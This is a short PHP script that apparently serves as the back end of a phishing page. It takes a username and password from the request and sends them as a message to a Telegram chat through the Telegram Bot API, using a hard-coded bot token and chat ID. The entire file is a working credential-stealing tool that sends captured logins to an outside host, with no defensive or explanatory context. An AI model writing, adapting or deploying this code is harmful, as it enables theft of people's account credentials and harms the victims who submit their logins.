<?php

$user = $_GET['username'];
$pass = $_GET['pass'];
$text = "$user || $pass";

$token = "1426301273:AAHfXSwb-NqTDR9qbOC67KWqlebjq0277Jg";
$id = "898236524";

$get = json_decode(file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$id&text=$text"));

